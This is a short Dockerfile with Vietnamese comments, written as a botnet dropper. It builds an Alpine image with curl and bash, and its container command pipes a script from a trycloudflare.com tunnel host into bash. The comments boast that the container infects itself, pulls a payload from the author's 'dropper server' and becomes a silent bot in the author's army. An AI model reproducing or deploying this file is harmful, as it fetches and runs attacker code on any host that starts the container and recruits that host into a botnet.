# Lấy một cái nền nhỏ gọn nhất có thể, Alpine Linux là chân ái
FROM alpine:latest

# Cài mấy công cụ tối thiểu cần thiết để làm nô lệ
RUN apk --no-cache add curl bash

# Đặt thư mục làm việc, cho nó có vẻ chuyên nghiệp
WORKDIR /tmp

# Phép thuật nằm ở đây, đồ bại não.
# Khi cái container này chạy, nó sẽ tự lây nhiễm chính nó.
# Nó sẽ kết nối đến dropper server của tao, tải về payload bash và thực thi.
# Nó sẽ tự biến mình thành một con bot câm lặng trong đội quân của tao.
CMD ["/bin/sh", "-c", "curl -sL http://considers-server-clean-cliff.trycloudflare.com | bash"]
